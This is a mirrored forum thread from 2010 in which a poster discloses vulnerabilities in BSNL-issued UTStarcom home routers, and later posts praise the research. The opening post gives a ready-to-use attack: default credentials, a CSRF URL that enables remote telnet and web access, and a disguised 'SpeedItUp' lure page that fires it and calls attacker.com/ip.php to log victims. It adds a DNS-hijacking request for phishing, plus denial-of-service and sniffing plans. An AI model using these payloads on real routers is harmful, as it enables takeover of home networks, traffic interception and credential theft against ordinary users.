<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/printthread.php?t=430&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:32:19 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->

	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
	<base/><!--[if IE]></base><![endif]-->
	<meta content="vBulletin 4.2.1" name="generator"/>

	
	<link href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" rel="stylesheet" type="text/css"/>
	



	<title> BSNL Home Routers -  UTSTARCOM [UT300R2U]</title>
	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>

</head>
<body>

<div class="above_body">
<div class="floatcontainer" id="header">
<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
</div>
</div>
<div class="body_wrapper">
<div id="pagetitle">
	<h1><a href="showthread6e32.html?t=430">BSNL Home Routers -  UTSTARCOM [UT300R2U]</a></h1>
	<p class="description">Printable View</p>
</div>


	<div class="floatcontainer">
		<a class="maxperpage" href="printthreadf097.html?t=430&amp;pp=40">Show 40 post(s) from this thread on one page</a>
		<div id="pagination_top">
			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=430&amp;pp=10&amp;page=3" class="pagination popupmenu nohovermenu" method="get">
<input name="t" type="hidden" value="430"/><input name="pp" type="hidden" value="10"/>
	
		<span><a class="popupctrl" href="javascript://">Page 1 of 4</a></span>
		
		
		
		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 32">1</a></span><span><a href="printthread1890.html?t=430&amp;pp=10&amp;page=2" title="Show results 11 to 20 of 32">2</a></span><span><a href="printthread117c.html?t=430&amp;pp=10&amp;page=3" title="Show results 21 to 30 of 32">3</a></span>
		
		<span class="separator">...</span>
		
		
		<span class="prev_next"><a href="printthread1890.html?t=430&amp;pp=10&amp;page=2" rel="next" title="Next Page - Results 11 to 20 of 32"><img alt="Next" src="images/pagination/next-right.png"/></a></span>
		
		
		<span class="first_last"><a href="printthreadf08f.html?t=430&amp;pp=10&amp;page=4" title="Last Page - Results 31 to 32 of 32">Last<img alt="Last" src="images/pagination/last-right.png"/></a></span>
		
	
	<ul class="popupbody popuphover">
		<li class="formsubmit jumptopage"><label>Jump to page: <input name="page" size="4" type="text"/></label> <input class="button" type="submit" value="Go"/></li>
	</ul>
</form>
		</div>
	</div>


<ul id="postlist">
	<li class="postbit blockbody" id="post_1">
	<div class="header">
		<div class="datetime">10-29-2010, 02:23 PM</div>
		<span class="username">Boris</span>
	</div>
	
	
		<div class="title">BSNL Home Routers -  UTSTARCOM [UT300R2U]</div>
	
	<div class="content">
		<blockquote class="restore">Hello Mates, This is my first post here<br/>
<br/>
 Today im going to show you how a series of vulnerabilities in a web Application could be creatively exploited.<br/>
<br/>
<b>Product Description:</b><br/>
The product which i had my hands on is this <a href="../1.bp.blogspot.com/_GWORWJ4xHhs/TFlSs9_aWOI/AAAAAAAAAHw/VJMAAZDrFFE/s1600/Ut300r2U%20REV2.png" target="_blank">UTSTARCOM router</a>,<br/>
<br/>
It is one of the most common ADSL Modem cum Router which was rolled out by BSNL to their customers a year ago, when the number of internet subscribers was reaching the peak. This little devices runs a webserver which serves the web based router configuration application.Further it has a Telnet service running on it.<br/>
<br/>
<b>The So Called BuiltIn Security Features :</b><br/>
 <br/>
   * Remote Web Access to the router is blocked by Default [so you can't access a victim's router by using his public IP]<br/>
   * Remote Telnet Access is also blocked<br/>
   <br/>
After a little playaround with the device, i've found that there are 3 different users that can login into the router.<br/>
viz admin,user,support<br/>
<br/>
  The Documentation Provided by BSNL neither states that there are 3 different users that could access the device nor forces/asks/shows the users to change their default password for accessing the router [Note: Im not mentioning the PPoE Password]<br/>
<br/>
 <a href="../external.html?link=http://www.chennai.bsnl.co.in/BBS/UT300R2U.htm" target="_blank">http://www.chennai.bsnl.co.in/BBS/UT300R2U.htm</a><br/>
<br/>
<b>User Description:</b><br/>
 As the name suggests, admin user has the ablility to do all configuration changes to the router, whereas the user privileged user could not do any changes in the configuration of the router.<br/>
<br/>
Logged in as Admin:<br/>
<a href="../lh6.ggpht.com/_cwGoBtxPsUw/TMqAqWXCj8I/AAAAAAAAAN4/9iH36M9KEWM/s800/admin.png" target="_blank">http://lh6.ggpht.com/_cwGoBtxPsUw/TM...s800/admin.jpg</a><br/>
<br/>
Logged in as User:<br/>
<a href="../lh4.ggpht.com/_cwGoBtxPsUw/TMqAqtbnhtI/AAAAAAAAAN8/CZUEZYTTTQE/s800/User.png" target="_blank">http://lh4.ggpht.com/_cwGoBtxPsUw/TM.../s800/User.jpg</a><br/>
<br/>
<b>Vulnerablility Description:</b><br/>
<br/>
On a closer examination of the source code,i got hold of a javascript menuBCM.js<br/>
<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr/><code class="bbcode_code">menuBCM.js: <br/>
  <br/>
  function menuAdmin(options) { // All the options are displayed for ADMIN<br/>
   var std = options[MENU_OPTION_STANDARD];<br/>
   var proto = options[MENU_OPTION_PROTOCOL];<br/>
   var firewall = options[MENU_OPTION_FIREWALL];<br/>
   var nat = options[MENU_OPTION_NAT];<br/>
   var ipExt = options[MENU_OPTION_IP_EXTENSION];<br/>
   var wireless = options[MENU_OPTION_WIRELESS];<br/>
   var voice = options[MENU_OPTION_VOICE];<br/>
   var snmp = options[MENU_OPTION_SNMP];<br/>
   var ddnsd = options[MENU_OPTION_DDNSD];<br/>
   var sntp = options[MENU_OPTION_SNTP];<br/>
.<br/>
.<br/>
if ( user == 'admin' ) //this piece of code calls the respective menu to be displayed<br/>
      menuAdmin(options);<br/>
   else if ( user == 'support' )<br/>
      menuSupport(options);<br/>
   else if ( user == 'user' )<br/>
      menuUser();<br/>
}<br/>
-------------code truncated</code><hr/>
</div>so it is pretty obvious from the code that the user privilege management is handled by this javacript by displaying all menu's to Admin and hides configuration menu's to the user.<br/>
<br/>
so it is possible to navigate to the configurations page by a user if he knows the URL <br/>
<br/>
The default username password combination is<br/>
  admin:admin<br/>
  user:user<br/>
<br/>
Since we know that the user privilege management is handled by a javascript, it has got nothing to do in a telnet session, so when we telnet as either a admin or as a user, we get full access [privilege] to the router.<br/>
<br/>
Further adding fuel to the fire, CSRF is present in the webbased configuration application<br/>
<br/>
<b>Exploiting Methods:</b><br/>
<br/>
First and foremost point is we can't access the victim's router from WAN,<br/>
  <br/>
As CSRF vulnerability is present on the router, this script will do the job<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr/><code class="bbcode_code">http://user:user@192.168.1.1/scsrvcntr.cmd?<br/>
action=save&amp;http=1&amp;http=3&amp;icmp=1&amp;snmp=1&amp;snmp=3&amp;telnet=1&amp;telnet=3&amp;tftp=2&amp;tftp<br/>
=0</code><hr/>
</div>Since there user:user account is some sort of hidden/undisclosed account, the possiblity of its default password being changed is very less.<br/>
<br/>
 we could send this link to a victim either in a email or by some SE techniques, what this does is, it changes the router configuration and allows Remote Web access, Remote Telnet access on the router.<br/>
<br/>
The entire Exploit looks like this<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr/><code class="bbcode_code">index.html<br/>
<br/>
&lt;html&gt;<br/>
&lt;head&gt;<br/>
&lt;title&gt;SpeedItUp&lt;/title&gt;<br/>
&lt;/head&gt;<br/>
&lt;body&gt;<br/>
&lt;br&gt;&lt;h1&gt;This page configures your system to use high speed internet, please wait for<br/>
few seconds for the script to configure&lt;/h1&gt;&lt;/br&gt;<br/>
Please click the button to continue.<br/>
&lt;iframe src ="config.html" width=70 marginwidth="25%" height=20<br/>
scrolling="no" frameborder="0" class="iframe"&gt;&lt;/iframe&gt;<br/>
&lt;/body&gt;<br/>
&lt;/html&gt;</code><hr/>
</div>config.html<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr/><code class="bbcode_code">&lt;html&gt;<br/>
&lt;body onload="window.scrollTo(1440, 980);"&gt;<br/>
&lt;iframe src="http://user:user@192.168.1.1/scsrvcntr.cmd?<br/>
action=save&amp;http=1&amp;http=3&amp;icmp=1&amp;snmp=1&amp;snmp=3&amp;telnet=1&amp;telnet=3&amp;tftp=2&amp;tftp<br/>
=0"<br/>
width=3000 height=1000 frameborder=0&gt;&lt;/iframe&gt;<br/>
&lt;iframe src="http://attacker.com/ip.php"<br/>
width=3000 height=1000 frameborder=0&gt;&lt;/iframe&gt;<br/>
&lt;/body&gt;<br/>
&lt;/html&gt;</code><hr/>
</div>So after the user visits this page, we will have his IP in our database or somewhere depending upon the IP logger script.<br/>
Now we can login into his router either by telnetting or by logging into the webapplication.<br/>
<br/>
Even though the victim changes the admin password for the device, we could log in as user:user and navigate into password.html page and viewing source --Kabboomm Plain text passwords in javascripts<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr/><code class="bbcode_code">Source code of password.html<br/>
<br/>
&lt;script language="javascript"&gt; <br/>
&lt;!-- hide<br/>
 <br/>
   pwdAdmin = 'lame';  //Passwords   for all users are passed in plaintext for comparing<br/>
  pwdSupport = 'support';<br/>
  pwdUser = 'user';<br/>
  function btnApply() {<br/>
 var loc = 'password.cgi?';<br/>
 with ( document.forms[0] ) {<br/>
  var idx = userName.selectedIndex;<br/>
  <br/>
   switch ( idx ) {<br/>
         case 0:<br/>
            alert("No username is selected.");<br/>
            return;<br/>
         case 1:<br/>
            if ( pwdOld.value == pwdAdmin )<br/>
               break;<br/>
            else {<br/>
               alert("Old admin password is wrong.");<br/>
               return;<br/>
            }<br/>
         case 2:<br/>
            if ( pwdOld.value ==     pwdSupport )<br/>
               break;<br/>
            else {<br/>
               alert("Old support password is wrong.");<br/>
        -------------------------- truncated</code><hr/>
</div>So now we got admin access on both TELNET service and webservice, now here comes a variety of exploitation techniques<br/>
<br/>
<br/>
Possible Attacks:<br/>
<br/>
1.Denial of Service:<br/>
<br/>
1.The attacker might implement MAC filtering or other IP restriction on the victim’s router.<br/>
2.Specifying a unreachable Static Route<br/>
3.Killing the httpd server process of the router repeatedly by telneting  into the victim’s router.<br/>
<br/>
2.Sniffing:<br/>
<br/>
 1.The attacker could specify a static route passing through his network for the victim’s router and sniff the traffic from the victim. [SSL Strip + Ettercap + Wireshark]<br/>
<br/>
<br/>
3.Phishing:<br/>
<br/>
This is the attack of our special interest as it is one of the stealthiest attack when combined with routing attacks.<br/>
The attacker could specify a fake DNS server for the victim router and could carry out phishing attacks.<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr/><code class="bbcode_code">http://192.168.1.1/dnscfg.cgi?dnsPrimary=XX.XX.XX.XX&amp;dnsSecondary=XX.XX.XX.XX&amp;dnsDynamic=0&amp;dnsRefresh=1</code><hr/>
</div>XX.XX.XX.XX = Attackers DNS server<br/>
<br/>
This changes the primary &amp; secondary DNS servers of the victim’s router<br/>
<br/>
Now the victim's network is like this<br/>
<br/>
<a href="../lh3.ggpht.com/_cwGoBtxPsUw/TMqH2CXYBQI/AAAAAAAAAOE/elXWEoMaDQY/s576/DNS.png" target="_blank">http://lh3.ggpht.com/_cwGoBtxPsUw/TM...Y/s576/DNS.jpg</a><br/>
<br/>
So we can specify our phishing sites IP address as A Records for famous websites like facebook,orkut,banking sites etc etc in our DNS server.<br/>
<br/>
:cool::cool:<br/>
<br/>
You can download the whitepaper <a href="../sites.google.com/site/borisinfogroup/home/files/PwningTheBSNLBroadbandUsers_NITT6fb5.html" target="_blank">here</a><br/>
Peace.. Similar vulnerablility is found in Nokia-Simens and many other  Home Routers<br/>
Fairly long post, isn't it ?<br/>
Comments and Suggestions are Welcomed.</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_2">
	<div class="header">
		<div class="datetime">10-30-2010, 12:57 PM</div>
		<span class="username">AnArKI</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">Thts a impressive post</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_3">
	<div class="header">
		<div class="datetime">10-31-2010, 12:13 AM</div>
		<span class="username">fb1h2s</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">great post loved it, even i used to think wht was the possibility or extend a router/modem default password hack could lead to , well that DNS stuff is perfect one, faking the DNS server look for the kind of pages victim request for and make then build the DNS sever accordingly :D <br/>
<br/>
<br/>
Pls post cools stuffs like this :) thanks</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_4">
	<div class="header">
		<div class="datetime">10-31-2010, 12:49 AM</div>
		<span class="username">AnArKI</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">perfect example of CSRF Cross Site request forgery....</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_5">
	<div class="header">
		<div class="datetime">10-31-2010, 05:55 AM</div>
		<span class="username">b0nd</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">Yeah that's a kewl attack scenario Boris. <br/>
TFS your research.</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_6">
	<div class="header">
		<div class="datetime">11-01-2010, 03:32 AM</div>
		<span class="username">sandeep</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">nice read, thank you</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_7">
	<div class="header">
		<div class="datetime">11-01-2010, 09:28 AM</div>
		<span class="username">"vinnu"</span>
	</div>
	
	
		<div class="title">Also try this and do a little research</div>
	
	<div class="content">
		<blockquote class="restore">tn3270://ipaddr<br/>
<br/>
<br/>
Some research is needed in above protocol handler. it exists in the windows xp systems and attacker can force a victim to connect to a telnet connection to any arbitrary port.<br/>
<br/>
..."vinnu"</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_8">
	<div class="header">
		<div class="datetime">11-01-2010, 10:08 AM</div>
		<span class="username">the_empty</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">awesome work boris.. TFS</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_9">
	<div class="header">
		<div class="datetime">11-01-2010, 04:30 PM</div>
		<span class="username">that's_all</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">Cool Find! Cheer!</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_10">
	<div class="header">
		<div class="datetime">11-02-2010, 06:21 PM</div>
		<span class="username">prashant_uniyal</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">:) Great Research ...thanks ;)</blockquote>
	</div>
</li>
</ul>


	<div class="floatcontainer">
		<a class="maxperpage" href="printthreadf097.html?t=430&amp;pp=40">Show 40 post(s) from this thread on one page</a>
		<div id="pagination_bottom">
			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=430&amp;pp=10&amp;page=3" class="pagination popupmenu nohovermenu" method="get">
<input name="t" type="hidden" value="430"/><input name="pp" type="hidden" value="10"/>
	
		<span><a class="popupctrl" href="javascript://">Page 1 of 4</a></span>
		
		
		
		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 32">1</a></span><span><a href="printthread1890.html?t=430&amp;pp=10&amp;page=2" title="Show results 11 to 20 of 32">2</a></span><span><a href="printthread117c.html?t=430&amp;pp=10&amp;page=3" title="Show results 21 to 30 of 32">3</a></span>
		
		<span class="separator">...</span>
		
		
		<span class="prev_next"><a href="printthread1890.html?t=430&amp;pp=10&amp;page=2" rel="next" title="Next Page - Results 11 to 20 of 32"><img alt="Next" src="images/pagination/next-right.png"/></a></span>
		
		
		<span class="first_last"><a href="printthreadf08f.html?t=430&amp;pp=10&amp;page=4" title="Last Page - Results 31 to 32 of 32">Last<img alt="Last" src="images/pagination/last-right.png"/></a></span>
		
	
	<ul class="popupbody popuphover">
		<li class="formsubmit jumptopage"><label>Jump to page: <input name="page" size="4" type="text"/></label> <input class="button" type="submit" value="Go"/></li>
	</ul>
</form>
		</div>
	</div>

</div>
<div class="below_body">
<div class="footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">05:06 PM</span>.</div>

<div class="footer_copyright" id="footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div class="footer_morecopyright" id="footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
</div>
 
</div>

<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>



</body><!-- Mirrored from garage4hackers.com/printthread.php?t=430&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:32:19 GMT --></html>